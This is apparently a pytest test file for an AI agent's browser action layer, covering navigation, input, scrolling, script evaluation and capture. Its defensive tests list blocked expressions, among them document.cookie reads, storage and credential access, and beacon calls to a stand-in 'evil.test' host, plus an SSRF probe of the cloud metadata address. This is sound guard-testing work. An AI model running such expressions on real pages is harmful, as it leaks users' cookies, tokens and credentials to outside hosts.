"""Action-layer tests: navigation, interaction, capture, evaluation.

These drive the real action signatures against fakes that mirror playwright's
locator/keyboard/mouse surface — no removed API is stubbed in (see _fakes.py).
"""

import pytest

from echo_agent.agent.browser import actions as act_mod
from echo_agent.agent.browser.session import BrowserSession

from ._fakes import FakeLocator, FakePage, element, make_payload


def _session(page=None, **kwargs):
    return BrowserSession(context=object(), page=page or FakePage(),
                          last_active=0.0, **kwargs)


async def _none(url):
    return None


# --- navigate ---------------------------------------------------------------

@pytest.mark.asyncio
async def test_navigate_blocks_ssrf(monkeypatch):
    async def _blocked(url):
        return "private address"

    monkeypatch.setattr(act_mod, "check_url_ssrf", _blocked)
    s = _session()
    err = await act_mod.navigate(s, "http://169.254.169.254/")
    assert "blocked" in err
    assert s.page.goto_url is None  # never navigated


@pytest.mark.asyncio
async def test_navigate_allows_public(monkeypatch):
    monkeypatch.setattr(act_mod, "check_url_ssrf", _none)
    s = _session()
    assert await act_mod.navigate(s, "https://example.com") == ""
    assert s.page.goto_url == "https://example.com"


@pytest.mark.asyncio
async def test_navigate_allow_private_skips_check(monkeypatch):
    async def _boom(url):  # pragma: no cover - must never run
        raise AssertionError("check_url_ssrf should be skipped")

    monkeypatch.setattr(act_mod, "check_url_ssrf", _boom)
    s = _session()
    assert await act_mod.navigate(s, "http://10.0.0.1/", allow_private=True) == ""


@pytest.mark.asyncio
async def test_navigate_blocked_request_maps_to_ssrf_message(monkeypatch):
    """A redirect hop aborted by the route gate must not look like a DNS error."""
    monkeypatch.setattr(act_mod, "check_url_ssrf", _none)
    page = FakePage()
    page.goto_exc = Exception("net::ERR_BLOCKED_BY_CLIENT at http://127.0.0.1")
    err = await act_mod.navigate(_session(page), "https://public.example/redir")
    assert "SSRF" in err


@pytest.mark.asyncio
async def test_navigate_other_failure_stays_navigation_failed(monkeypatch):
    monkeypatch.setattr(act_mod, "check_url_ssrf", _none)
    page = FakePage()
    page.goto_exc = Exception("net::ERR_NAME_NOT_RESOLVED")
    err = await act_mod.navigate(_session(page), "https://public.example/")
    assert err.startswith("navigation failed")


# --- click / type -----------------------------------------------------------

@pytest.mark.asyncio
async def test_click_unknown_ref_tells_model_to_resnapshot():
    s = _session()
    s.ref_map = {"@e1": FakeLocator()}
    err = await act_mod.click(s, "@e99")
    assert "@e99" in err and "snapshot" in err


@pytest.mark.asyncio
async def test_click_uses_ref_map():
    s = _session()
    loc = FakeLocator()
    s.ref_map = {"@e1": loc}
    assert await act_mod.click(s, "@e1") == ""
    assert loc.clicked == 1


@pytest.mark.asyncio
async def test_click_failure_is_reported():
    s = _session()
    loc = FakeLocator()
    loc.raise_on.add("click")
    s.ref_map = {"@e1": loc}
    assert "click failed" in await act_mod.click(s, "@e1")


@pytest.mark.asyncio
async def test_type_fills_without_enter_by_default():
    s = _session()
    loc = FakeLocator()
    s.ref_map = {"@e1": loc}
    assert await act_mod.type_text(s, "@e1", "hello") == ""
    assert loc.filled == "hello"
    assert loc.pressed == []


@pytest.mark.asyncio
async def test_type_press_enter_submits():
    """fill() emits no key events, so submitting a search box needs a real Enter."""
    s = _session()
    loc = FakeLocator()
    s.ref_map = {"@e1": loc}
    assert await act_mod.type_text(s, "@e1", "q", press_enter=True) == ""
    assert loc.pressed == ["Enter"]


@pytest.mark.asyncio
async def test_type_reports_enter_failure_distinctly():
    s = _session()
    loc = FakeLocator()
    loc.raise_on.add("press")
    s.ref_map = {"@e1": loc}
    assert "Enter failed" in await act_mod.type_text(s, "@e1", "q", press_enter=True)


# --- press ------------------------------------------------------------------

@pytest.mark.asyncio
async def test_press_on_page_keyboard():
    s = _session()
    assert await act_mod.press_key(s, "Enter") == ""
    assert s.page.keyboard.pressed == ["Enter"]


@pytest.mark.asyncio
async def test_press_on_element_uses_locator():
    s = _session()
    loc = FakeLocator()
    s.ref_map = {"@e1": loc}
    assert await act_mod.press_key(s, "Escape", ref="@e1") == ""
    assert loc.pressed == ["Escape"]
    assert s.page.keyboard.pressed == []


@pytest.mark.asyncio
async def test_press_accepts_modifier_chord():
    s = _session()
    assert await act_mod.press_key(s, "Control+a") == ""


@pytest.mark.parametrize("key", ["", "!! bad !!", "a b"])
@pytest.mark.asyncio
async def test_press_rejects_invalid_keys(key):
    s = _session()
    assert "无效按键" in await act_mod.press_key(s, key)
    assert s.page.keyboard.pressed == []


@pytest.mark.asyncio
async def test_press_unknown_ref_is_rejected():
    s = _session()
    assert "不存在" in await act_mod.press_key(s, "Enter", ref="@e9")


# --- scroll -----------------------------------------------------------------

@pytest.mark.asyncio
async def test_scroll_down_uses_wheel():
    s = _session()
    assert await act_mod.scroll(s, "down") == ""
    assert s.page.mouse.wheels == [(0, 600)]


@pytest.mark.asyncio
async def test_scroll_custom_amount_and_direction():
    s = _session()
    assert await act_mod.scroll(s, "up", amount=250) == ""
    assert s.page.mouse.wheels == [(0, -250)]


@pytest.mark.asyncio
async def test_scroll_bottom_uses_script():
    s = _session()
    assert await act_mod.scroll(s, "bottom") == ""
    assert any("scrollHeight" in e for e in s.page.evaluated)


@pytest.mark.asyncio
async def test_scroll_top_uses_zero_offset():
    s = _session()
    assert await act_mod.scroll(s, "top") == ""
    assert s.page.evaluated == ["window.scrollTo(0, 0)"]


@pytest.mark.asyncio
async def test_scroll_rejects_bad_direction():
    s = _session()
    assert "无效滚动方向" in await act_mod.scroll(s, "sideways")


# --- history ----------------------------------------------------------------

@pytest.mark.asyncio
async def test_back_forward_reload():
    s = _session()
    assert await act_mod.go_back(s) == ""
    assert await act_mod.go_forward(s) == ""
    assert await act_mod.reload(s) == ""
    assert (s.page.back, s.page.forward, s.page.reloaded) == (1, 1, 1)


# --- hover / select / upload ------------------------------------------------

@pytest.mark.asyncio
async def test_hover():
    s = _session()
    loc = FakeLocator()
    s.ref_map = {"@e1": loc}
    assert await act_mod.hover(s, "@e1") == ""
    assert loc.hovered is True


@pytest.mark.asyncio
async def test_select_falls_back_from_value_to_label():
    """The model copies the label it saw in the snapshot, not the value attr."""
    s = _session()
    loc = FakeLocator()
    loc.raise_on.add("reject_value")
    s.ref_map = {"@e1": loc}
    assert await act_mod.select_option(s, "@e1", ["Beta"]) == ""
    assert loc.selected.get("label") == ["Beta"]


@pytest.mark.asyncio
async def test_select_prefers_value_when_it_matches():
    s = _session()
    loc = FakeLocator()
    s.ref_map = {"@e1": loc}
    assert await act_mod.select_option(s, "@e1", ["v2"]) == ""
    assert loc.selected.get("value") == ["v2"]


@pytest.mark.asyncio
async def test_select_requires_values():
    s = _session()
    s.ref_map = {"@e1": FakeLocator()}
    assert "至少一个 value" in await act_mod.select_option(s, "@e1", [])


@pytest.mark.asyncio
async def test_upload_sets_input_files():
    s = _session()
    loc = FakeLocator()
    s.ref_map = {"@e1": loc}
    assert await act_mod.upload_files(s, "@e1", ["/tmp/a.txt"]) == ""
    assert loc.files == ["/tmp/a.txt"]


@pytest.mark.asyncio
async def test_upload_requires_paths():
    s = _session()
    s.ref_map = {"@e1": FakeLocator()}
    assert "至少一个文件路径" in await act_mod.upload_files(s, "@e1", [])


# --- wait -------------------------------------------------------------------

@pytest.mark.asyncio
async def test_wait_defaults_to_networkidle():
    s = _session()
    assert await act_mod.wait_for(s) == ""
    assert s.page.wait_states == ["networkidle"]


@pytest.mark.asyncio
async def test_wait_for_text_does_not_wait_on_load_state():
    s = _session()
    assert await act_mod.wait_for(s, text="Done") == ""
    assert s.page.wait_states == []


@pytest.mark.asyncio
async def test_wait_for_text_timeout_names_the_text():
    page = FakePage()
    page._text_locator.raise_on.add("wait_for")
    err = await act_mod.wait_for(_session(page), text="Done", timeout_sec=3)
    assert "'Done'" in err and "3s" in err


@pytest.mark.asyncio
async def test_wait_rejects_unknown_state():
    s = _session()
    assert "无效等待状态" in await act_mod.wait_for(s, state="bogus")


# --- evaluate policy --------------------------------------------------------

@pytest.mark.parametrize("expr", [
    "document.cookie",
    "window.localStorage.getItem('t')",
    "sessionStorage.clear()",
    "indexedDB.open('db')",
    "location.href='http://169.254.169.254/'",
    "location.replace('/x')",
    "location.assign('/x')",
    "window.open('http://evil.test')",
    "navigator.credentials.get({})",
    "navigator.sendBeacon('http://evil.test', d)",
])
def test_eval_policy_refuses_sensitive_expressions(expr):
    assert act_mod.check_eval_expression(expr) != ""


def test_eval_policy_defeats_whitespace_evasion():
    assert act_mod.check_eval_expression("document . cookie") != ""


def test_eval_policy_allows_plain_dom_reads():
    assert act_mod.check_eval_expression("document.title") == ""


def test_eval_policy_rejects_empty():
    assert "不能为空" in act_mod.check_eval_expression("   ")


def test_eval_policy_opt_out_allows_everything():
    assert act_mod.check_eval_expression("document.cookie", allow_unsafe=True) == ""


# --- evaluate ---------------------------------------------------------------

@pytest.mark.asyncio
async def test_evaluate_returns_result():
    page = FakePage()
    page.eval_results["document.title"] = "T"
    assert await act_mod.evaluate(_session(page), "document.title") == ("T", "")


@pytest.mark.asyncio
async def test_evaluate_refusal_does_not_touch_page():
    page = FakePage()
    text, err = await act_mod.evaluate(_session(page), "document.cookie")
    assert text == "" and "拒绝" in err
    assert page.evaluated == []


@pytest.mark.asyncio
async def test_evaluate_truncates_huge_result():
    page = FakePage()
    page.eval_default = "x" * 99999
    text, err = await act_mod.evaluate(_session(page), "big()")
    assert err == ""
    assert "截断" in text and len(text) < 5000


@pytest.mark.asyncio
async def test_evaluate_stringifies_non_str_result():
    page = FakePage()
    page.eval_default = {"a": 1}
    text, err = await act_mod.evaluate(_session(page), "obj()")
    assert err == "" and "'a'" in text


@pytest.mark.asyncio
async def test_evaluate_labels_undefined_result():
    """repr(None) would show the model "None" for a JS void/undefined result."""
    page = FakePage()
    page.eval_default = None
    assert await act_mod.evaluate(_session(page), "void 0") == ("undefined", "")


@pytest.mark.asyncio
async def test_evaluate_quotes_empty_string_result():
    """An empty string is a real result, not "no result"."""
    page = FakePage()
    page.eval_default = ""
    assert await act_mod.evaluate(_session(page), "''") == ('""', "")


@pytest.mark.asyncio
async def test_evaluate_error_is_reported():
    page = FakePage()
    page.eval_exc = RuntimeError("ReferenceError: x")
    _, err = await act_mod.evaluate(_session(page), "x")
    assert "evaluate failed" in err


# --- capture ----------------------------------------------------------------

@pytest.mark.asyncio
async def test_screenshot_returns_bytes_and_honours_full_page():
    s = _session()
    assert await act_mod.screenshot(s, full_page=True) == b"PNGDATA"
    assert s.page.screenshot_kwargs == {"full_page": True}


@pytest.mark.asyncio
async def test_screenshot_failure_returns_empty():
    page = FakePage()
    page.screenshot_exc = RuntimeError("no renderer")
    assert await act_mod.screenshot(_session(page)) == b""


@pytest.mark.asyncio
async def test_get_images_returns_rows():
    page = FakePage()
    page.eval_results["images"] = [
        {"url": "https://x/a.png", "alt": "a", "w": 64, "h": 64}]
    rows = await act_mod.get_images(_session(page))
    assert rows[0]["url"] == "https://x/a.png"


@pytest.mark.asyncio
async def test_get_images_failure_returns_empty_list():
    page = FakePage()
    page.eval_exc = RuntimeError("detached")
    assert await act_mod.get_images(_session(page)) == []


# --- refresh_snapshot -------------------------------------------------------

@pytest.mark.asyncio
async def test_refresh_snapshot_populates_ref_map():
    page = FakePage([make_payload([element("button", "ok", "/html/body/button[1]")])])
    s = _session(page)
    text = await act_mod.refresh_snapshot(s)
    assert "@e1" in text and "ok" in text
    assert set(s.ref_map) == {"@e1"}


@pytest.mark.asyncio
async def test_refresh_snapshot_surfaces_and_drains_dialogs():
    """An auto-answered dialog must be reported once, then stop repeating."""
    page = FakePage([make_payload([]), make_payload([])])
    s = _session(page)
    s.record_dialog({"type": "alert", "message": "surprise"})
    first = await act_mod.refresh_snapshot(s)
    assert "已自动取消弹窗 alert: surprise" in first
    assert "弹窗" not in await act_mod.refresh_snapshot(s)


@pytest.mark.asyncio
async def test_refresh_snapshot_reports_accept_policy_wording():
    page = FakePage([make_payload([])])
    s = _session(page, dialog_policy="accept")
    s.record_dialog({"type": "confirm", "message": "ok?"})
    assert "已自动确认弹窗" in await act_mod.refresh_snapshot(s)
